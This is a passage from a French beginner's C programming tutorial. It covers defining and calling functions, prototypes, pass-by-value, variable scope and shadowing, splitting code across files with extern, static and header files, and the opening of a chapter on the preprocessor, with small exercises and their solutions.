rien, à chaque fois qu'on recopie une de ces suites d'instructions récurrentes, on réinvente la roue. On perd ainsi beaucoup de temps à faire du copier-coller où à réécrire ce qui a déjà été fait. Les informaticiens ont donc inventé un moyen qui permet à ces suites d'instructions d'être présentes une seule fois dans le programme et d'être réutilisables au besoin. On a donc inventé les fonctions . Avec les fonctions La technique du sous-programme consiste à n'écrire qu'un seul exemplaire de ces suites d'instructions, et lui donner un nom. Au lieu de recopier cet exemplaire à chaque fois qu'on veut le réutiliser, il suffira tout simplement de placer son nom à la place. On appellera cette suite d'instruction une fonction . Cet exemplaire sera écrit en dehors du programme principal, le fameux main que l'on utilise depuis le début. On peut remarquer que la fonction main est déjà une fonction, qui regroupe tout le programme. Les fonctions, qui sont des bouts de code réutilisables au besoin, présentent ainsi de gros avantages. Elles sont réutilisables . Plus besoin de recopier bêtement du code plusieurs fois de suite ! Avec une fonction, il suffit d'écrire une seule fois la fonction et ensuite de l'appeler autant de fois que l'on veut. Elles sont plus facilement maintenables : si votre fonction est inadaptée, il suffit d'en changer le code. C'est beaucoup plus rapide que de modifier plusieurs exemplaires d'une même suite d'instruction, surtout s'ils sont disséminés n'importe comment dans tout le programme. Elles permettent de mieux s'organiser : en divisant le code en fonctions, on peut ainsi séparer les différentes opérations et mieux s'y retrouver lors de la relecture du code. C'est quand même plus agréable de lire un code bien aéré qu'une gigantesque suite d'instructions de 2000 lignes dans laquelle tout est mélangé n'importe comment. Bref, les fonctions n'ont que des avantages. Reste à savoir comment faire pour créer notre fonction, ce que nous allons voir dès la sous-partie suivante. Déclarer une fonction Une fonction n'est donc qu'un vulgaire bloc de code, un morceau de programme. Mais ce morceau de programme a tout de même quelques caractéristiques. Par exemple, imaginons que je veuille créer une fonction qui calcule une opération mathématique complexe. On va prendre le logarithme d'un nombre, par exemple (si vous ne savez pas ce que c'est, ce n'est pas important). Notre fonction va donc devoir manipuler un nombre, celui dont on veut calculer le logarithme. De même, elle va fournir un résultat, le logarithme du nombre. Avec cet exemple, on voit qu'une fonction doit être définie par trois éléments. Elle a parfois besoin de paramètres : ce sont toutes les informations que l'on donne à la fonction pour qu'elle puisse travailler. Ces informations vont donner des données que notre fonction va devoir manipuler afin d'obtenir un résultat. Dans notre exemple, le nombre dont on veut calculer le logarithme est un paramètre de la fonction. Elle contient aussi du code : ce code va dire ce que va faire la fonction. C'est tout ce qui compose l'intérieur d'une fonction, une fonction sans code, une fonction vide entre autres est une fonction inutile. Et enfin, notre fonction peut renvoyer un résultat . Ce n'est pas obligatoire d'en renvoyer un, mais la majorité des fonctions renvoient un résultat. Déclarer une fonction Maintenant que vous avez vu la partie \"théorique\", regardons comment tout cela s'applique en C. On vient de voir qu'une fonction est constituée de plusieurs éléments. Tous ces éléments seront donc indiqués dans notre fonction, à des endroits différents. Mais commençons par le commencement : nous allons d'abord apprendre à déclarer une fonction : cela consiste à indiquer à notre langage qu'on veut créer une fonction. Une fois celle-ci déclarée, il ne restera plus qu'à dire ce qu'elle fait, en écrivant son code et en spécifiant le résultat. Pour déclarer une fonction, nous allons devoir donner quelques informations sur notre fonction, et notamment sur ses arguments et sur son résultat. Ces fameuses informations sont : le type de retour : il s'agit du type du résultat de la fonction. Après tout, notre fonction pourrait aussi bien renvoyer un nombre entier, qu'un flottant ou un caractère, aussi préciser le type du résultat est obligatoire. le nom de la fonction : c'est vous qui le choisissez. Les règles sont les mêmes que pour les variables. les paramètres : les paramètres sont ce avec quoi la fonction va travailler. Vous pouvez en mettre autant que vous voulez. Pour déclarer une fonction, il va falloir préciser ces trois détails. Voici comment procéder pour préciser ces trois paramètres et ainsi déclarer une fonction : type identificateur (paramètres) { /* corps de la fonction */ } À l'intérieur de notre fonction (dans ce qui est nommé le corps de la fonction dans l'exemple du dessus), on va y placer le code de notre fonction. Pour illustrer ce concept, prenons un exemple tout banal : int ma_fonction ( int parametre ) { /* Instructions */ } J'ai ici défini une fonction appelée ma_fonction . Elle prend un int comme paramètre, et a pour résultat un int . void Il se peut que l'on est besoin de coder une fonction qui ne retourne aucun résultat. C'est un cas courant en C. Ce genre de fonction est appelé procédure . Pour écrire une procédure, il faut indiquer à la fonction en question qu'elle ne doit rien retourner. Pour ce faire, il existe un \"type de retour\" spécial : void . Ce type signifie \"vide\", et sert à indiquer que la fonction n'a pas de résultat. Ce mot-clef sert aussi à indiquer qu'une fonction ne prend aucun paramètre. C'est assez rare, mais cela arrive. Dans ce cas, il suffit de définir la fonction en mettant void dans la liste des paramètres. Paramètres Un paramètre sert à fournir des informations à la fonction lors de son exécution. La fonction printf par exemple récupère ce qu'elle doit afficher dans la console à l'aide de paramètres. Vous pouvez envoyer autant de paramètres à une fonction que vous voulez, il suffit de les séparer à l'aide d'une virgule. Cependant, ils doivent avoir des noms différents, tout comme les variables. Il est aussi possible de ne pas mettre d'arguments dans notre fonction, comme indiqué plus haut. Exemples Pour vous faire bien saisir toutes ces notions, entrainez vous à déclarer des fonctions. Essayez de déclarer une fonction : retournant un double et prenant un char et un int en argument ; retournant un unsigned short et ne prenant aucun paramètre ; retournant un float et prenant un int , un long et un double en paramètres ; retournant un int et prenant un int constant et un unsigned long en paramètre ; ne retournant rien et ne prenant aucun paramètre ; Je pense qu'avec tous ces exemples vous commencez à bien saisir comment déclarer une fonction. Le corps d'une fonction Intéressons-nous maintenant au corps de la fonction, le code qu'il y a à l'intérieur. Comme pour la fonction main , le code est à l'intérieur des accolades. Et ce code, c'est nous qui allons l'écrire. Alors que doit-on écrire ? En bref, ce que vous voulez que la fonction fasse. return À ce stade, vous savez comment déclarer une fonction sans problème. Il vous manque juste une dernière information : comment faire pour préciser quel est le résultat de la fonction ? Comment lui dire : « Le résultat que tu dois renvoyer, c'est ça » ? Pour cela, on doit utiliser le mot-clef return . Une fois que vous avez une variable qui contient le résultat que vous voulez, il suffit d'écrire return , suivi du nom de la variable, le tout suivi d'un point-virgule. À ce moment-là, la fonction s'arrêtera et renverra son résultat immédiatement. Cela signifie que tout le code qui est écrit après le return ne sera pas exécuté : notre fonction a déjà son résultat de disponible, pourquoi faire quoi que ce soit de plus ? Petite remarque : un return peut parfaitement renvoyer une valeur qui est une constante. Pour donner un exemple, on va prendre une fonction assez simple, qu'on nommera valueSign . Notre fonction va prendre un argument de type int en entrée et va renvoyer : 0 si cet argument est nul ; 1 si celui-ci est positif ; et -1 si celui-ci est négatif. Une version naïve de cette fonction s'écrirait comme ceci : int valueSign ( int a ) { if ( a > 0 ) { return 1 ; } else if ( a < 0 ) { return - 1 ; } else { return 0 ; } } Variables locales Autre détail, qui concerne les variables que vous déclarez à l'intérieur du corps d'une fonction. Autant vous prévenir tout de suite : n'essayez pas d'accéder à une variable qui est déclarée dans une fonction en dehors de celle-ci. Si vous faites cela, vous allez au-devant de graves ennuis. En effet, sauf cas exceptionnels, il faut savoir que ces variables ne sont accessibles que dans notre fonction, et pas de l'extérieur. C'est ainsi : les variables déclarées à l'intérieur de la fonction sont des données temporaires qui lui permettent de faire ce qu'on lui demande. Ces données sont des données internes à notre fonction, qu'elle seule doit manipuler et qui ne doivent généralement pas être accessibles à d'autres programmes ou d'autres fonctions. Si ce n'est pas le cas, c'est que cette variable doit être passée en paramètre ou qu'elle doit être renvoyée en tant que résultat. En fait, vous pouvez considérer que dans la majorité des cas, ces variables déclarées dans une fonction sont créées quand on commence l'exécution de la fonction, et qu'elles sont enlevées de la mémoire une fois que la fonction renvoie son résultat. Si je dis la majorité des cas, c'est qu'il y a une exception. Mais laissons cela de côté pour le moment : le temps de parler des variables statiques n'est pas encore arrivé. Exemple Prenons un exemple tout bête. Vous voulez faire une fonction qui renvoie le carré d'un nombre passé en paramètre. Commençons déjà par traduire notre fonction en pseudo-code : Entrée : nombre Carré : Multiplier nombre par lui-même Retourner nombre Maintenant, exerçons-nous en codant cet algorithme. Je vous encourage à le faire avant de regarder la solution, cela vous fera progresser. Sinon, celle-ci ce trouve ici . Maintenant que vous avez saisi le principe, nous allons apprendre à utiliser nos fonctions, car pour l'instant elles ne font rien. Utiliser une fonction Nous avons déjà utilisé quelques fonctions, notamment printf et scanf . Pour les utiliser, il suffit de taper le nom de la fonction suivi des paramètres entre parenthèses. Eh bien, pour nos fonctions c'est exactement la même chose. Prenons pour illustration la fonction carre vue dans la partie précédente. Voici le programme complet : #include <stdio.h> int carre ( int nombre ) { return nombre * nombre ; } int main ( void ) { int nombre , nombre_au_carre ; puts ( \"Entrez un nombre : \" ); scanf ( \"%d\" , & nombre ); nombre_au_carre = carre ( nombre ); printf ( \"Voici le carre de %d : %d \\n \" , nombre , nombre_au_carre ); return 0 ; } On demande à l'utilisateur de rentrer un nombre entier. Une fois ceci fait, on appelle la fonction avec cette ligne : nombre_au_carre = carre ( nombre ); On dit que nombre est un argument de la fonction carre . Paramètres et arguments sont très liés ; la différence entre les deux est que les premiers apparaissent lors que la définition de la fonction alors que les seconds apparaissent lors de son l'appel. On demande ensuite à attribuer à la variable nombre_au_carre la valeur retournée par la fonction carre . Ainsi, si nombre vaut 4, on appelle la fonction, et celle-ci retournera alors 16 (car $4&#94;2 = 16$). Un petit code commenté ? #include <stdio.h> /* d) le nombre passé en paramètre en c) est récupéré */ int carre ( int nombre ) { /* e) on fait le calcul et on renvoie la valeur */ return nombre * nombre ; } int main ( void ) { /* a) on déclare nos variables */ int nombre , nombre_au_carre ; puts ( \"Entrez un nombre : \" ); /* b) on récupère la valeur de nombre */ scanf ( \"%d\" , & nombre ); /* c) on appelle la fonction carre */ nombre_au_carre = carre ( nombre ); /* f) nombre_au_carre vaut maintenant la valeur retournée par la fonction carre */ /* g) on affiche le résultat */ printf ( \"Voici le carre de %d : %d \\n \" , nombre , nombre_au_carre ); return 0 ; } Ça va, vous suivez ? C'est simple : lors de l'appel de la fonction, on lui donne des arguments et le programme s'occupe du reste. C'est lui qui fera les calculs et qui renverra la valeur à afficher. Sachez qu'il est possible d'optimiser notre code en se passant de cette variable intermédiaire qui stocke le résultat. En effet, on peut très bien appeler la fonction directement dans le printf , comme ceci : #include <stdio.h> int carre ( int nombre ) { return nombre * nombre ; } int main ( void ) { int nombre ; puts ( \"Entrez un nombre :\" ); scanf ( \"%d\" , & nombre ); printf ( \"Voici le carre de %d : %d \\n \" , nombre , carre ( nombre )); return 0 ; } Ce code revient au même que le précédant, car le deuxième paramètre de printf sera la valeur retournée par la fonction. Autrement dit, c'est un nombre dans les deux cas, et affichera bien la même chose à l'écran : Entrez un nombre : 10 Voici le carré de 10 : 100 La fonction main appelle la fonction printf , qui elle-même appelle la fonction carre . C'est une imbrication de fonctions. Ainsi, une fonction peut en appeler une autre ; c'est ainsi que tout programme écrit en C fonctionne. Entrainez-vous à appeler des fonctions en utilisant toutes les fonctions que nous avons vues au cours de ce chapitre. Nous verrons d'autres exercices en fin de chapitre. Appel de fonctions Il faut aussi préciser une chose importante sur les arguments : si on passe une variable en argument d'une fonction, la variable en elle-même ne sera pas modifiée. La fonction utilisera à la place une copie de la variable ! C'est très important, et c'est source de comportements bizarres si on ne fait pas attention. Retenez bien : les arguments d'une fonction sont copiés et c'est cette copie qui est manipulée par notre fonction . Considérons l'exemple suivant. #include <stdio.h> void fonction ( int nombre ) { ++ nombre ; printf ( \"Variable nombre dans la fonction : %d \\n \" , nombre ); } int main ( void ) { int nombre = 5 ; fonction ( nombre ); printf ( \"Variable nombre dans le main : %d \\n \" , nombre ); return 0 ; } Variable nombre dans la fonction : 6 Variable nombre dans le main : 5 Vous avez vu ? La fonction manipule bien une copie de la variable, car lorsque l'on revient dans la fonction main , la valeur de la variable est toujours la même : l'original n'a pas été modifié. Nous verrons néanmoins dans quelques chapitres comment modifier l'original dans la fonction et non une copie. On peut légitimement se demander pourquoi un tel comportement. La raison est assez complexe, mais je peux au moins vous dire que la raison est fortement liée au matériel de notre ordinateur. La façon dont les fonctions sont exécutées au niveau de notre ordinateur impose que ces arguments soient copiés. Pour le moment, ce n'est pas de votre niveau, mais vous aurez surement la réponse plus tard. ​ Les prototypes Avez-vous remarqué qu'à chaque fois je mets ma fonction avant la fonction main ? En effet, mettre la fonction après le main provoquera un comportement indéterminé. La compilation pourrait très bien marcher comme elle pourrait planter. En effet, lorsque la fonction est placée avant, le compilateur connait ses paramètres et sa valeur de retour. Du coup, quand on appelle la fonction, le compilateur vérifie que les arguments qu'on lui donne sont bons. Si au contraire la fonction est après, le compilateur ne connait pas la fonction. Du coup, il lui fixe arbitrairement des caractéristiques : la fonction retourne un int et prend un nombre indéterminé de paramètres. Et quand on tente d'appeler la fonction, la compilation plante, car les arguments ne correspondent pas aux yeux du compilateur. Heureusement, il existe une sorte de mode d'emploi qui permet d'indiquer toutes les caractéristiques d'une fonction au compilateur. Avec cette indication, on peut placer la fonction où on veut dans le code. Et ce mode d'emploi a un nom : un prototype . Un prototype se déclare quasiment comme une fonction : type nom_de_la_fonction(arguments); Voilà à quoi ressemble un prototype. Placez-le simplement tout en haut de votre fichier et c'est bon ! votre fonction est utilisable partout dans le code. Essayez donc d'appliquer ça à la fonction carre : #include <stdio.h> int carre ( int nombre ); int main ( void ) { int nombre , nombre_au_carre ; puts ( \"Entrez un nombre :\" ); scanf ( \"%d\" , & nombre ); nombre_au_carre = carre ( nombre ); printf ( \"Voici le carre de %d : %d \\n \" , nombre , nombre_au_carre ); return 0 ; } int carre ( int nombre ) { nombre *= nombre ; return nombre ; } Ce code marche parfaitement, vous pouvez tester si vous voulez. La seule chose à retenir c'est le point-virgule après le prototype. Il est obligatoire, sinon la compilation plantera. Si vous mettez toutes vos fonctions avant le main, les prototypes peuvent sembler inutiles, mais je vous encourage à les utiliser. Dès que vous aurez des projets conséquents, vous serez obligés de les déclarer. Avant de conclure sur cette partie, je tiens à préciser quelque chose : dans les paramètres du prototype, seuls les types sont vraiment nécessaires, les identificateurs sont facultatifs. Ainsi le prototype précédant peut s'écrire : int carre ( int ); Cependant, cette astuce ne marche que pour les prototypes, n'allez pas le faire pour une fonction (je vous laisse chercher pourquoi). Exercices Comme le dit le vieil adage : \"C'est en forgeant qu'on devient forgeron\". C'est donc en vous entrainant que vous devenez petit à petit des programmeurs C. Dans cette partie, je vais vous proposer des algorithmes de fonctions, ce sera à vous de les traduire en C. Je mets la solution au cas où vous auriez vraiment du mal, mais je vous encourage à le faire avant de regarder la solution. C'est comme ça que vous progresserez le plus. Afficher un rectangle Le premier exercice que je vous propose est d'afficher un rectangle. C'est très simple vous allez voir. Voici l'algorithme que je vous propose : Entrée : longueur, largeur Afficher Déclarer deux variables i (longueur) et j (largeur); Pour (i = 0 ; i < longueur ; i++) { Pour (j = 0; j < largeur ; j++) { Afficher le symbole '*' } Sauter une ligne } Le code devra afficher ceci dans la console : Donnez la longueur : 5 Donnez la largeur : 3 *** *** *** *** *** Correction #include <stdio.h> /* Prototype avec const qui permet de voir que l'on ne modifie pas la variable */ void rectangle ( const int longueur , const int largeur ); int main ( void ) { int longueur , largeur ; puts ( \"Donnez la longueur : \" ); scanf ( \"%d\" , & longueur ); puts ( \"Donnez la largeur : \" ); scanf ( \"%d\" , & largeur ); puts ( \" \" ); rectangle ( longueur , largeur ); return 0 ; } void rectangle ( const int longueur , const int largeur ) { int i , j ; for ( i = 0 ; i < longueur ; i ++ ) { for ( j = 0 ; j < largeur ; j ++ ) { putchar ( '*' ); } puts ( \" \" ); } } Essayez aussi d'afficher le rectangle dans l'autre sens si vous voulez, cela vous servira d'entrainement. Afficher un triangle Cette fonction est similaire à la précédente, mais pas tout à fait identique, sauf que cette fois on veut afficher un triangle. Rassurez-vous, l'exercice est plus simple qu'il n'y parait. Pour bien faire cet exercice, on va utiliser d'abord le pseudo-code pour écrire notre algorithme. En voici un tout simple que je vous propose : Entrée : nombre_de_lignes Afficher Déclarer deux variables i (nombre de lignes) et j (nombre de colonnes); Pour (i = 0 ; i < nombre_de_lignes ; i++) { Pour (j = 0; j <= i ; j++) { Afficher le symbole '*' } Sauter une ligne } Ce code, une fois traduit, devrait afficher la sortie suivante dans la console : Donnez un nombre : 5 * ** *** **** ***** Bien entendu, la taille du triangle variera en fonction du nombre que l'on donne. Correction #include <stdio.h> void triangle ( const int nombre ); int main ( void ) { int nombre ; puts ( \"Donnez un nombre : \" ); scanf ( \"%d\" , & nombre ); puts ( \" \" ); triangle ( nombre ); return 0 ; } void triangle ( const int nombre ) { int i , j ; for ( i = 0 ; i < nombre ; i ++ ) { for ( j = 0 ; j <= i ; j ++ ) { putchar ( '*' ); } puts ( \" \" ); } } Coupure Imaginez le scénario suivant. Vous êtes un agent dans une banque et aujourd'hui vous recevez votre client. Celui-ci vous demande de lui livrer une somme avec la coupure qu'il vous a indiquée. Par exemple, il vous dit qu'il souhaite récupérer 300 000 € uniquement en billets de 500€ et de 200€. Dans ce cas vous lui donnerez le plus de billets de 500€ possible puis vous continuerez avec des billets de 200€. Ici, la coupure sera la suivante : Des billets de 100€. Des billets de 50€. Des billets de 20€. Des billets de 10€. Des pièces de 2€. Des pièces de 1€. Votre client vous indique la somme qu'il souhaite et vous la lui fournissez en tenant compte de la coupure spécifique. Quelle somme voulez-vous ? 285 2 billet(s) de 100. 1 billet(s) de 50. 1 billet(s) de 20. 1 billet(s) de 10. 2 pièce(s) de 2. 1 pièce(s) de 1. Exemple de prototype pour la fonction : void coupure ( const int somme ); Et exemple de pseudo-code : Entrée : somme Afficher Déclarer deux variables n (nombre de billet) = somme et tmp (variable temporaire) = somme; Si n /= 100 > 0 { Afficher \"n billet(s) de 100.\" } tmp -= n * 100; n = tmp / 50; Si (tmp / 50) > 0 { Afficher \"n billet(s) de 50.\" } tmp -= n * 50; n = tmp / 20; Si (tmp / 20) > 0 { Afficher \"n billet(s) de 20.\" } tmp -= n * 20; n = tmp / 10; Si (tmp / 10) > 0 { Afficher \"n billet(s) de 10.\" } tmp -= n * 10; n = tmp / 2; Si (tmp / 2) > 0 { Afficher \"n piece(s) de 2.\" } Si ((tmp -= n * 2) > 0) { Afficher \"tmp piece(s) de 1.\" } Correction #include <stdio.h> void coupure ( const int somme ) { int n = somme , tmp = somme ; if (( n /= 100 ) > 0 ) { printf ( \"%d billet(s) de 100. \\n \" , n ); } tmp -= n * 100 ; n = tmp / 50 ; if (( tmp / 50 ) > 0 ) { printf ( \"%d billet(s) de 50. \\n \" , n ); } tmp -= n * 50 ; n = tmp / 20 ; if (( tmp / 20 ) > 0 ) { printf ( \"%d billet(s) de 20. \\n \" , n ); } tmp -= n * 20 ; n = tmp / 10 ; if (( tmp / 10 ) > 0 ) { printf ( \"%d billet(s) de 10. \\n \" , n ); } tmp -= n * 10 ; n = tmp / 2 ; if (( tmp / 2 ) > 0 ) { printf ( \"%d billet(s) de 2. \\n \" , n ); } if (( tmp -= n * 2 ) > 0 ) { printf ( \"%d piece(s) de 1. \\n \" , tmp ); } } int main ( void ) { int somme ; scanf ( \"%d\" , & somme ); coupure ( somme ); return 0 ; } Afin de bien s'entrainer, essayez donc de créer quelques fonctions en variant les paramètres. Nous aurons bientôt un chapitre entier dédié aux exercices, qui vous fera manipuler toutes les notions que nous avons vues jusque-là. En attendant, le prochain chapitre parlera de comment découper un projet. Découper son projet Ce chapitre est la suite directe du précédent : nous allons voir comment découper nos projets en plusieurs fichiers. En effet, même si l'on découpe bien son projet en fonctions, ce dernier est difficile à relire si tout est contenu dans le même fichier. Ce chapitre a donc pour but de vous apprendre à découper vos projets efficacement. Portée et masquage La notion de portée Avant de voir comment diviser nos programmes en plusieurs fichiers, il est nécessaire de vous présenter une notion importante, celle de portée . La portée d'une variable ou d'une fonction est la partie du programme où cette dernière est utilisable. Il existe plusieurs types de portées, cependant nous n'en verrons que deux : au niveau d'un bloc ; au niveau d'un fichier. Au niveau d'un bloc Une portée au niveau d'un bloc signifie qu'une variable n'est utilisable, visible que de sa déclaration jusqu'à la fin du bloc dans lequel elle est déclarée. Illustration : #include <stdio.h> int main ( void ) { { int nombre = 3 ; printf ( \"%d \\n \" , nombre ); } /* Incorrect ! */ printf ( \"%d \\n \" , nombre ); return 0 ; } Dans ce code, la variable nombre est déclarée dans un sous-bloc. Sa portée est donc limitée à ce dernier et elle ne peut pas être utilisée en dehors. Au niveau d'un fichier Une portée au niveau d'un fichier signifie qu'une variable n'est utilisable, visible, que de sa déclaration jusqu'à la fin du fichier dans lequel elle est déclarée. Pour obtenir une variable ayant une portée au niveau d'un fichier, il est nécessaire de la déclarer en dehors de tout bloc, par exemple comme ceci : #include <stdio.h> int nombre = 3 ; int triple ( void ) { return nombre * 3 ; } int main ( void ) { nombre = triple (); printf ( \"%d \\n \" , nombre ); return 0 ; } Dans ce code, la variable nombre a une portée au niveau du fichier et peut par conséquent être aussi bien utilisée dans la fonction triple que dans la fonction main . La notion de masquage En voyant les deux types de portées, vous vous êtes peut-être posé la question suivante : que se passe-t-il s'il existe plusieurs variables et/ou plusieurs fonctions de même nom ? Eh bien, cela dépend de la portée de ces dernières : si elles ont la même portée comme dans l'exemple ci-dessous, alors le compilateur sera incapable de déterminer à quelle variable ou à quelle fonction le nom fait référence et, dès lors, retournera une erreur. int main(void) { int nombre = 10; int nombre = 20; return 0; } En revanche, si elles ont des portées différentes, alors celle ayant la portée la plus faible sera privilégiée, on dit qu'elle masque celle(s) de portée plus élevée. Autrement dit, dans l'exemple qui suit, c'est la variable du bloc de la fonction main qui sera affichée. #include <stdio.h> int nombre = 10 ; int main ( void ) { int nombre = 20 ; printf ( \"%d \\n \" , nombre ); return 0 ; } Notez que je dis « celle(s) de portée plus élevée » car les variables déclarées dans un sous-bloc ont une portée plus faible que celle déclarée dans le bloc supérieure. Ainsi le code ci-dessous est parfaitement valide et affichera 30. #include <stdio.h> int nombre = 10 ; int main ( void ) { int nombre = 20 ; if ( nombre == 20 ) { int nombre = 30 ; printf ( \"%d \\n \" , nombre ); } return 0 ; } Diviser pour mieux régner Création d'un nouveau fichier source Bien, maintenant que nous avons vu la notion de portée, voyons comment diviser notre projet en plusieurs fichiers. Voici la marche à suivre pour crée un nouveau fichier .c , appelé fichier source . Pour Code::Blocks Pour ajouter des fichiers au projet, il faut faire File -> New -> File... . De là, vous allez tomber sur une fenêtre comme celle-ci : Pour ajouter un fichier source, cliquez sur C/C++ source . Si vous êtes sous Windows, vous pouvez passer la première fenêtre sans problème, celle-ci indiquant simplement que vous vous apprêtez à créer un fichier. Vous arrivez ensuite sur une fenêtre où l'on vous demandera plusieurs renseignements (cf. ci-dessous). La première case demande où sera situé le fichier. Cliquez sur les trois-points pour ouvrir une fenêtre. Par défaut, celle-ci s'ouvre sur le dossier contenant votre projet. Sinon, déplacez-vous pour atteindre le dossier de votre projet. Donnez ensuite un nom au fichier (appelons-le autre.c ). Laissez de côté le deuxième cadre, il sera rempli automatiquement. Enfin, cochez toutes les cases du bas ( Debug et Release ), puis cliquez sur Finish . Pour Visual Studio Pour Visual Studio 2010 la manipulation est simple. Faites un clic droit sur votre projet, puis Ajouter -> Nouvel élément (ou bien Ctrl + Maj + A ). Vous tombez sur cette fenêtre : Pour ajouter un fichier source, il suffit de cliquer sur Fichier C++ (.cpp) , de donner un nom au fichier (pour l'exemple, autre.c ) en précisant bien l'extension .c (sinon votre fichier sera considéré comme un fichier C++ et votre projet sera donc compilé par le compilateur C++) et de cliquer sur Ajouter . Pour Xcode Sous Xcode, afin d'ajouter un fichier à votre projet, appuyez sur command + N , vous devriez voir ceci : Sélectionnez C File et appuyez sur Next . On vous demande alors le nom de votre fichier (nommez-le autre.c ), dans quel dossier vous souhaitez l'enregistrer et dans quel projet l'ajouter. Une fois ces champs remplis, appuyez sur Create . Lorsque vous revenez dans votre projet, vous remarquerez, qu'en dessous de main.c , il y a votre nouveau fichier. Compilation manuelle Si jamais vous compilez en ligne de commande, il vous suffit de créer un nouveau fichier .c et de le rajouter lors de la compilation. Pour la suite de ce chapitre, je vais considérer que vous avez donc deux fichiers source. Dans mon cas, il s'agira de main.c et de autre.c . Continuons donc notre découvertes des portées. Les fonctions Dans le chapitre précédent, nous avions, entre autres, créé une fonction triple que nous avons placée dans le même fichier que la fonction main . Essayons à présent de les répartir dans deux fichiers distincts, par exemple comme ceci : /* Fichier autre.c */ int triple ( int nombre ) { return nombre * 3 ; } /* Fichier main.c */ int main ( void ) { int nombre = triple ( 3 ); return 0 ; } Si vous testez ce code, vous aurez droit à un bel avertissement de votre compilateur du type « implicit declaration of function 'triple' » . Quel est le problème ? Le problème est que la fonction triple n'est pas déclarée dans le fichier main.c et que le compilateur ne la connaît donc pas lorsqu'il compile le fichier. Pour corriger cette situation, nous devons déclarer la fonction en signalant au compilateur que cette dernière se situe dans un autre fichier. Pour ce faire, nous allons inclure le prototype de la fonction triple dans le fichier main.c en le précédant du mot-clé extern , qui signifie que la fonction est externe au fichier. /* Fichier autre.c */ int triple ( int nombre ) { return nombre * 3 ; } /* Fichier main.c */ extern int triple ( int nombre ); int main ( void ) { int nombre = triple ( 3 ); return 0 ; } En terme technique, on dit que la fonction triple est définie dans le fichier autre.c (car c'est là que se situe le corps de la fonction) et qu'elle est déclarée dans le fichier main.c . Sachez qu'une fonction ne peut être définie qu' une seule fois . Pour information, notez que le mot-clé extern est facultatif devant un prototype (il est implicitement inséré par le compilateur). Je vous conseille cependant de l'utiliser, dans un soucis de clarté et de symétrie avec les déclarations de variables. Les variables La même méthode peut être appliquée aux variables, mais uniquement à celle ayant une portée au niveau d'un fichier . Également, à l'inverse des fonctions, il est plus difficile de distinguer une définition d'une déclaration de variable (elles n'ont pas de corps comme les fonctions). La règle pour les différencier est qu'une déclaration sera précédée du mot-clé extern alors que la définition non. C'est à vous de voir dans quel fichier vous souhaitez définir la variable, mais elle ne peut être définie qu' une seule fois . Enfin, sachez que seule la définition peut comporter une initialisation. Ainsi, cet exemple est tout à fait valide : /* Fichier autre.c */ int nombre = 10 ; /* une définition */ extern int autre ; /* une déclaration */ /* Fichier main.c */ extern int nombre ; /* une déclaration */ int autre = 10 ; /* une définition */ Alors que celui-ci, non : /* Fichier autre.c */ int nombre = 10 ; /* il existe une autre définition */ extern int autre = 10 ; /* une déclaration ne peut pas comprendre une initialisation */ /* Fichier main.c */ int nombre = 20 ; /* il existe une autre définition */ int autre = 10 ; /* une définition */ On m'aurait donc menti ? Je vous ai dit plus haut qu'il n'était possible de définir une variable ou une fonction qu'une seule fois, en fait ce n'est pas tout à fait vrai. Il est possible de rendre une variable (ayant une portée au niveau d'un fichier) ou une fonction locale à un fichier en précédant sa définition du mot-clé static . De cette manière, la variable ou la fonction est interne au fichier où elle est définie et n'entre pas en conflit avec les autres variables ou fonctions locales à d'autres fichiers. La contrepartie est que la variable ou la fonction ne peut être utilisée que dans le fichier où elle est définie (c'est assez logique). Ainsi, l'exemple suivant est tout à fait correct et affichera 20. /* Fichier autre.c */ static int nombre = 10 ; /* Fichier main.c */ #include <stdio.h> static int nombre = 20 ; int main ( void ) { printf ( \"%d \\n \" , nombre ); return 0 ; } Les fichiers d'en-têtes Pour terminer ce chapitre, il ne nous reste plus qu'à voir les fichiers d'en-têtes. Jusqu'à présent, lorsque vous voulez utiliser une fonction ou une variable définie dans un autre fichier, vous insérez sa déclaration dans le fichier ciblé. Seulement voilà, si vous utilisez dix fichiers et que vous décidez un jour d'ajouter ou de supprimer une fonction ou une variable ou encore de modifier une déclaration, vous vous retrouvez Gros-Jean comme devant et vous êtes bon pour modifier les dix fichiers ... ce qui n'est pas très pratique. Pour résoudre ce problème, on utilise des fichiers d'en-têtes (d'extension .h ). Ces derniers contiennent conventionnellement des déclarations de fonctions et de variables et sont inclus via la directive #include , dans les fichiers qui utilisent les fonctions et variables en question. La création d'un fichier d'en-tête fonctionne de la même manière que celle d'un fichier source. Les utilisateurs d'un environnement de développement intégré devront simplement penser à sélectionner Header File ( Fichier d'en-tête en français) au lieu de Source File . La structure d'un fichier d'en-tête est généralement de la forme : #ifndef CONSTANTE_H #define CONSTANTE_H /* les déclarations */ #endif Les directives du préprocesseur sont là pour éviter les inclusions multiples : vous devez les utiliser pour chacun de vos fichiers d'en-têtes. Vous pouvez remplacer CONSTANTE par ce que vous voulez, le plus simple et le plus fréquent étant le nom de votre fichier, par exemple AUTRE_H si votre fichier se nomme autre.h . Voici un exemple d'utilisation de fichier d'en-tête : /* Fichier d'en-tête autre.h */ #ifndef AUTRE_H #define AUTRE_H extern int triple ( int nombre ); #endif /* Fichier source autre.c */ #include \"autre.h\" int triple ( int nombre ) { return nombre * 3 ; } /*Fichier source main.c */ #include \"autre.h\" int main ( void ) { int nombre = triple ( 3 ); return 0 ; } Plusieurs remarques à propos de ce code : dans la directive d'inclusion, les fichiers d'en-têtes sont entre guillemets et non entre crochets comme les fichiers d'en-têtes de la bibliothèque standard ; les fichiers sources et d'en-têtes correspondants portent le même nom ; je vous conseille d'inclure le fichier d'en-tête dans le fichier source correspondant (dans mon cas autre.h dans autre.c ) afin d'éviter des problèmes de portée ; si vous compilez à la main, il vous suffit de spécifier les fichiers sources, les fichiers d'en-têtes seront automatiquement inclus. Nous avons conclu ce chapitre en parlant des fichiers d'en-tête. Nous avons vu de nouvelles directives de préprocesseur. Il est temps de vous les expliquer. Nous apprendrons à connaitre et à maitriser le préprocesseur dans le chapitre suivant. Le préprocesseur On l'a déjà rencontré, on l'a déjà utilisé, mais on ne s'est jamais vraiment intéressé à son fonctionnement ni aux possibilités qu'il nous offre. Je parle bien sûr du préprocesseur . Ce chapitre va vous faire découvrir que le préprocesseur est bien plus puissant que la simple utilisation dont on en a fait jusqu'à maintenant. Le fonctionnement du préprocesseur Qu'est-ce que le préprocesseur ? Comme dit en introduction, nous avons déjà rencontré le préprocesseur, sans jamais vraiment s'intéresser à lui. Le préprocesseur est un programme qui réalise des traitements sur le code source avant que ce dernier ne soit réellement compilé. On peut considérer que le préprocesseur a trois rôles (même si c'est 